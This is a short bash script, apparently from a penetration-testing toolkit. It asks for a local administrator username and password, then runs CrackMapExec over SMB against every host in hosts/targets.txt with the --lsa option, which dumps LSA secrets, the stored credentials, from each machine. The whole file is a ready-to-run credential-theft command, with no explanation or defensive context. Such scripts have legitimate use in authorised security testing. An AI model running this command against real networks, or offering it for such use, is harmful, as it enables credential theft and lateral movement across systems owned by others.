echo "I want to dump LSA using a local administrator account"
echo
#Read in creds to dump from DC
echo "Enter Local Admin Username (i.e. Administrator)"
read user
echo "Enter Password (i.e. Password123!)"
read pass
cme smb hosts/targets.txt -u $user -p "$pass" -d LOCALHOST --lsa
